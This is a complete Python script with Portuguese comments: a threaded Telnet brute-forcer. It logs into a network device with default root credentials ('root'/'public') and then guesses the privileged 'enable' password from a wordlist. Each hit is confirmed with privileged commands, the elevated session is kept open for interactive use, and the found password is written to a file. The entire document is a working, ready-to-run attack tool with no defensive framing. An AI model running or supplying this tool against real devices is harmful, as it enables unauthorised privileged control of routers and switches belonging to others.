#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Script de Bruteforce para Escalar Privilégios via Enable no Telnet
Realiza login como root (senha conhecida) e tenta descobrir a senha do enable
Mantém sessão ativa após encontrar a senha
"""

import socket
import sys
import time
import threading
from typing import Optional, Tuple
from queue import Queue
import signal
import re

class TelnetEnableBruteforce:
    def __init__(self, host: str, root_username: str = "root", root_password: str = "public",
                 port: int = 23, timeout: int = 10, delay: float = 0.5, 
                 max_retries: int = 3):
        """
        Inicializa o objeto TelnetEnableBruteforce
        
        Args:
            host: Endereço IP ou hostname do alvo
            root_username: Nome de usuário root (padrão: root)
            root_password: Senha do root já conhecida (padrão: public)
            port: Porta do serviço Telnet (padrão: 23)
            timeout: Timeout para conexões (padrão: 10 segundos)
            delay: Delay entre tentativas (padrão: 0.5 segundos)
            max_retries: Número máximo de tentativas em caso de erro (padrão: 3)
        """
        self.host = host
        self.port = port
        self.root_username = root_username
        self.root_password = root_password
        self.timeout = timeout
        self.delay = delay
        self.max_retries = max_retries
        self.found_password = None
        self.active_session = None  # Sessão ativa após encontrar senha
        self.attempts = 0
        self.failed_attempts = 0
        self.lock = threading.Lock()
        self.stop_flag = False
        
        # Padrões para detectar falsos positivos
        self.false_positive_patterns = [
            b"incorrect",
            b"wrong",
            b"invalid",
            b"failed",
            b"denied",
            b"error",
            b"try again",
            b"access denied",
            b"permission denied",
            b"authentication failed"
        ]
        
        # Padrões de sucesso para enable
        self.enable_success_patterns = [
            b"#",  # Prompt privilegiado
            b"enable",  # Confirmação de enable
            b"privileged",  # Modo privilegiado
            b"CLI#",  # Prompt CLI privilegiado
            b"config",  # Modo de configuração
        ]
        
        # Padrões que indicam que ainda está no modo normal (não privilegiado)
        self.normal_mode_patterns = [
            b"CLI>",  # Prompt normal (não privilegiado)
            b">",  # Prompt normal
            b"$",  # Shell normal
        ]
    
    def connect(self) -> Optional[socket.socket]:
        """
        Estabelece conexão com o serviço Telnet
        
        Returns:
            Socket conectado ou None em caso de erro
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.host, self.port))
            return sock
        except socket.timeout:
            return None
        except socket.error as e:
            return None
        except Exception as e:
            return None
    
    def read_until(self, sock: socket.socket, pattern: bytes, timeout: float = 5.0) -> bytes:
        """
        Lê dados do socket até encontrar um padrão ou timeout
        
        Args:
            sock: Socket conectado
            pattern: Padrão a procurar
            timeout: Timeout em segundos
            
        Returns:
            Dados lidos
        """
        data = b""
        start_time = time.time()
        sock.settimeout(timeout)
        
        try:
            while time.time() - start_time < timeout:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if pattern in data:
                        break
                except socket.timeout:
                    continue
        except Exception:
            pass
        
        return data
    
    def login_as_root(self, sock: socket.socket) -> Tuple[bool, str]:
        """
        Faz login como root usando as credenciais conhecidas (public)
        
        Args:
            sock: Socket conectado
            
        Returns:
            Tupla (sucesso, mensagem)
        """
        try:
            # Lê o banner inicial
            time.sleep(0.3)
            initial_data = self.read_until(sock, b"Username:", timeout=3.0)
            
            # Verifica se pede username
            if b"Username:" in initial_data or b"username:" in initial_data.lower():
                # Envia username
                sock.send((self.root_username + "\r\n").encode())
                time.sleep(0.3)
            
            # Lê prompt de senha
            password_prompt = self.read_until(sock, b"Password:", timeout=3.0)
            
            if b"Password:" not in password_prompt and b"password:" not in password_prompt.lower():
                return False, "Prompt de senha não encontrado"
            
            # Envia senha do root (public)
            sock.send((self.root_password + "\r\n").encode())
            time.sleep(0.5)
            
            # Lê resposta do login
            response = self.read_until(sock, b"CLI>", timeout=3.0)
            
            # Verifica se o login foi bem-sucedido
            response_lower = response.lower()
            
            # Verifica padrões de erro
            for pattern in self.false_positive_patterns:
                if pattern in response_lower:
                    return False, f"Login falhou: padrão de erro detectado"
            
            # Verifica se recebeu prompt (CLI> indica sucesso)
            if b"CLI>" in response or b"#" in response or b"$" in response or b">" in response:
                # Confirma que está logado tentando um comando simples
                time.sleep(0.2)
                sock.send(b"help\r\n")
                time.sleep(0.3)
                help_response = self.read_until(sock, b"CLI>", timeout=2.0)
                
                if b"CLI>" in help_response or b"#" in help_response:
                    return True, "Login como root bem-sucedido"
            
            return False, "Login falhou: prompt não reconhecido"
            
        except socket.timeout:
            return False, "Timeout durante login"
        except Exception as e:
            return False, f"Erro durante login: {str(e)}"
    
    def try_enable_password(self, enable_password: str) -> Tuple[bool, str, Optional[socket.socket]]:
        """
        Tenta fazer enable com uma senha específica
        
        Args:
            enable_password: Senha do enable a ser testada
            
        Returns:
            Tupla (sucesso, mensagem, socket_ativo)
        """
        if self.stop_flag:
            return False, "Interrompido", None
        
        retries = 0
        while retries < self.max_retries:
            try:
                sock = self.connect()
                if not sock:
                    retries += 1
                    time.sleep(self.delay)
                    continue
                
                # Primeiro, faz login como root (senha conhecida: public)
                login_success, login_msg = self.login_as_root(sock)
                if not login_success:
                    sock.close()
                    retries += 1
                    time.sleep(self.delay)
                    continue
                
                # Limpa qualquer buffer residual
                time.sleep(0.2)
                try:
                    sock.recv(4096)
                except:
                    pass
                
                # Envia comando enable
                sock.send(b"enable\r\n")
                time.sleep(0.3)
                
                # Lê resposta (pode pedir senha ou já estar habilitado)
                enable_response = self.read_until(sock, b"Password:", timeout=3.0)
                
                # Verifica se pediu senha do enable
                if b"Password:" in enable_response or b"password:" in enable_response.lower():
                    # Envia senha do enable
                    sock.send((enable_password + "\r\n").encode())
                    time.sleep(0.5)
                    
                    # Lê resposta após enviar senha
                    response = self.read_until(sock, b"#", timeout=3.0)
                    response_lower = response.lower()
                    
                    # Verifica padrões de erro (falsos positivos)
                    for pattern in self.false_positive_patterns:
                        if pattern in response_lower:
                            sock.close()
                            with self.lock:
                                self.attempts += 1
                                self.failed_attempts += 1
                            return False, f"Senha incorreta (padrão de erro detectado)", None
                    
                    # Verifica se ainda está no modo normal (falso positivo)
                    for pattern in self.normal_mode_patterns:
                        if pattern in response and b"CLI>" in response:
                            # Ainda está no modo normal, não privilegiado
                            sock.close()
                            with self.lock:
                                self.attempts += 1
                                self.failed_attempts += 1
                            return False, "Ainda no modo normal (senha incorreta)", None
                    
                    # Verifica se recebeu prompt privilegiado (#)
                    if b"#" in response and b"CLI>" not in response:
                        # Verifica novamente para evitar falsos positivos
                        # Tenta enviar um comando privilegiado para confirmar
                        time.sleep(0.2)
                        sock.send(b"show version\r\n")
                        time.sleep(0.5)
                        confirm_response = self.read_until(sock, b"#", timeout=3.0)
                        
                        # Se ainda está no modo privilegiado após comando, confirma sucesso
                        if b"#" in confirm_response or b"CLI#" in confirm_response:
                            # Confirmação final: faz login completo novamente para verificar
                            # Mas mantém esta conexão aberta
                            verification_success = self.verify_enable_password(enable_password)
                            
                            if verification_success:
                                with self.lock:
                                    self.attempts += 1
                                self.found_password = enable_password
                                self.stop_flag = True
                                # Retorna o socket ativo para manter a sessão
                                return True, "Senha do enable encontrada e verificada! Sessão ativa mantida.", sock
                            else:
                                sock.close()
                                with self.lock:
                                    self.attempts += 1
                                    self.failed_attempts += 1
                                return False, "Falso positivo detectado na verificação", None
                        else:
                            # Pode ser um falso positivo
                            sock.close()
                            with self.lock:
                                self.attempts += 1
                                self.failed_attempts += 1
                            return False, "Possível falso positivo (comando não executado)", None
                    
                    sock.close()
                    with self.lock:
                        self.attempts += 1
                        self.failed_attempts += 1
                    return False, "Senha incorreta", None
                
                else:
                    # Não pediu senha, pode já estar habilitado ou erro
                    sock.close()
                    retries += 1
                    time.sleep(self.delay)
                    continue
                
            except socket.timeout:
                retries += 1
                try:
                    sock.close()
                except:
                    pass
                time.sleep(self.delay)
            except Exception as e:
                retries += 1
                try:
                    sock.close()
                except:
                    pass
                time.sleep(self.delay)
        
        with self.lock:
            self.attempts += 1
            self.failed_attempts += 1
        return False, f"Erro após {self.max_retries} tentativas", None
    
    def verify_enable_password(self, enable_password: str) -> bool:
        """
        Verifica a senha do enable fazendo login completo novamente
        Garante que não é um falso positivo
        
        Args:
            enable_password: Senha do enable a verificar
            
        Returns:
            True se a senha está correta, False caso contrário
        """
        try:
            sock = self.connect()
            if not sock:
                return False
            
            # Faz login como root (senha conhecida: public)
            login_success, _ = self.login_as_root(sock)
            if not login_success:
                sock.close()
                return False
            
            time.sleep(0.2)
            try:
                sock.recv(4096)
            except:
                pass
            
            # Tenta enable
            sock.send(b"enable\r\n")
            time.sleep(0.3)
            
            enable_response = self.read_until(sock, b"Password:", timeout=3.0)
            
            if b"Password:" in enable_response or b"password:" in enable_response.lower():
                sock.send((enable_password + "\r\n").encode())
                time.sleep(0.5)
                
                response = self.read_until(sock, b"#", timeout=3.0)
                
                # Verifica se realmente está no modo privilegiado
                if b"#" in response and b"CLI>" not in response:
                    # Tenta um comando privilegiado para confirmar
                    time.sleep(0.2)
                    sock.send(b"configure terminal\r\n")
                    time.sleep(0.5)
                    config_response = self.read_until(sock, b"#", timeout=3.0)
                    
                    if b"#" in config_response or b"CLI(config" in config_response:
                        sock.close()
                        return True
            
            sock.close()
            return False
            
        except Exception as e:
            try:
                sock.close()
            except:
                pass
            return False
    
    def maintain_session(self, sock: socket.socket):
        """
        Mantém a sessão ativa e permite interação
        
        Args:
            sock: Socket com sessão privilegiada ativa
        """
        print("\n" + "=" * 60)
        print("[+] SESSÃO PRIVILEGIADA ATIVA")
        print("=" * 60)
        print(f"[+] Host: {self.host}:{self.port}")
        print(f"[+] Usuário: {self.root_username}")
        print(f"[+] Senha do enable: {self.found_password}")
        print("[+] Você está no modo privilegiado (enable)")
        print("[+] Digite comandos ou 'exit' para sair")
        print("=" * 60 + "\n")
        
        try:
            # Configura socket para não bloquear
            sock.settimeout(0.1)
            
            while True:
                try:
                    # Lê dados disponíveis do servidor
                    try:
                        data = sock.recv(4096)
                        if data:
                            print(data.decode('utf-8', errors='ignore'), end='', flush=True)
                    except socket.timeout:
                        pass
                    except Exception:
                        break
                    
                    # Verifica se há entrada do usuário (usando select seria melhor, mas socket simples funciona)
                    import select
                    if sys.platform != 'win32':
                        ready, _, _ = select.select([sock], [], [], 0.1)
                        if ready:
                            data = sock.recv(4096)
                            if data:
                                print(data.decode('utf-8', errors='ignore'), end='', flush=True)
                    
                except KeyboardInterrupt:
                    print("\n[!] Encerrando sessão...")
                    break
                except Exception:
                    break
                
                # Para Windows, usa input() simples
                if sys.platform == 'win32':
                    import msvcrt
                    if msvcrt.kbhit():
                        command = input()
                        if command.lower() == 'exit':
                            print("[!] Encerrando sessão...")
                            break
                        sock.send((command + "\r\n").encode())
        except KeyboardInterrupt:
            print("\n[!] Sessão encerrada pelo usuário")
        except Exception as e:
            print(f"\n[!] Erro na sessão: {e}")
        finally:
            try:
                sock.close()
                print("[*] Conexão fechada")
            except:
                pass
    
    def bruteforce(self, wordlist_path: str, threads: int = 5) -> Optional[str]:
        """
        Realiza bruteforce da senha do enable usando uma wordlist
        
        Args:
            wordlist_path: Caminho para o arquivo de wordlist
            threads: Número de threads paralelas (padrão: 5)
            
        Returns:
            Senha encontrada ou None
        """
        print(f"[*] Iniciando bruteforce do enable em {self.host}:{self.port}")
        print(f"[*] Usuário root: {self.root_username}")
        print(f"[*] Senha root conhecida: {self.root_password} (não será feito bruteforce)")
        print(f"[*] Wordlist: {wordlist_path}")
        print(f"[*] Threads: {threads}")
        print(f"[*] Delay entre tentativas: {self.delay}s")
        print("-" * 60)
        
        # Lê a wordlist
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[!] Erro: Arquivo {wordlist_path} não encontrado")
            return None
        except Exception as e:
            print(f"[!] Erro ao ler wordlist: {e}")
            return None
        
        print(f"[*] Total de senhas na wordlist: {len(passwords)}")
        print("-" * 60)
        
        # Fila de senhas
        password_queue = Queue()
        for password in passwords:
            password_queue.put(password)
        
        # Handler para Ctrl+C
        def signal_handler(sig, frame):
            print("\n[!] Interrompido pelo usuário")
            self.stop_flag = True
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Variável para armazenar sessão ativa
        active_socket = None
        
        # Função worker para threads
        def worker():
            nonlocal active_socket
            while not password_queue.empty() and not self.stop_flag:
                try:
                    password = password_queue.get_nowait()
                except:
                    break
                
                if self.stop_flag:
                    break
                
                success, message, sock = self.try_enable_password(password)
                
                with self.lock:
                    current_attempt = self.attempts
                    if success:
                        print(f"\n[+] SENHA DO ENABLE ENCONTRADA: {password}")
                        print(f"[+] Tentativas realizadas: {current_attempt}")
                        print(f"[+] Taxa de sucesso: {((current_attempt - self.failed_attempts) / current_attempt * 100):.2f}%")
                        if sock:
                            active_socket = sock
                        return
                    else:
                        if current_attempt % 100 == 0:
                            print(f"[*] Tentativas: {current_attempt} | Testando: {password[:20]}...")
                
                time.sleep(self.delay)
                password_queue.task_done()
        
        # Inicia threads
        thread_list = []
        for i in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        # Aguarda threads terminarem
        for t in thread_list:
            t.join()
        
        print("\n" + "-" * 60)
        print(f"[*] Bruteforce concluído")
        print(f"[*] Total de tentativas: {self.attempts}")
        print(f"[*] Tentativas falhadas: {self.failed_attempts}")
        
        if self.found_password and active_socket:
            print(f"[+] Senha do enable encontrada: {self.found_password}")
            # Mantém sessão ativa
            self.maintain_session(active_socket)
            return self.found_password
        elif self.found_password:
            print(f"[+] Senha do enable encontrada: {self.found_password}")
            return self.found_password
        else:
            print("[!] Senha do enable não encontrada na wordlist")
            return None


def main():
    """Função principal"""
    if len(sys.argv) < 3:
        print("Uso: python telnet_enable_bruteforce.py <IP> <wordlist> [opções]")
        print("Exemplo: python telnet_enable_bruteforce.py 192.168.1.1 xato_net_passwords.txt")
        print("\nOpções:")
        print("  --root-user USER     Nome de usuário root (padrão: root)")
        print("  --root-pass PASS     Senha do root (padrão: public)")
        print("  --port PORT          Porta (padrão: 23)")
        print("  --threads N          Número de threads (padrão: 5)")
        print("  --delay SECONDS      Delay entre tentativas (padrão: 0.5)")
        sys.exit(1)
    
    host = sys.argv[1]
    wordlist = sys.argv[2]
    
    # Parse de argumentos opcionais
    root_username = "root"
    root_password = "public"  # Padrão: public
    port = 23
    threads = 5
    delay = 0.5
    
    i = 3
    while i < len(sys.argv):
        if sys.argv[i] == "--root-user" and i + 1 < len(sys.argv):
            root_username = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == "--root-pass" and i + 1 < len(sys.argv):
            root_password = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == "--port" and i + 1 < len(sys.argv):
            port = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == "--threads" and i + 1 < len(sys.argv):
            threads = int(sys.argv[i + 1])
            i += 2
        elif sys.argv[i] == "--delay" and i + 1 < len(sys.argv):
            delay = float(sys.argv[i + 1])
            i += 2
        else:
            i += 1
    
    bruteforcer = TelnetEnableBruteforce(
        host, root_username, root_password, 
        port=port, delay=delay
    )
    result = bruteforcer.bruteforce(wordlist, threads)
    
    if result:
        # Salva a senha encontrada
        try:
            with open("SenhaEnable.txt", 'w', encoding='utf-8') as f:
                f.write(f"senha do enable localizada pelo brute force: {result}\n")
                f.write(f"senha adicionada ao arquivo\n")
            print(f"\n[+] Senha salva em SenhaEnable.txt")
        except Exception as e:
            print(f"[!] Aviso: Não foi possível salvar a senha: {e}")
        sys.exit(0)
    else:
        sys.exit(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrompido pelo usuário")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Erro inesperado: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)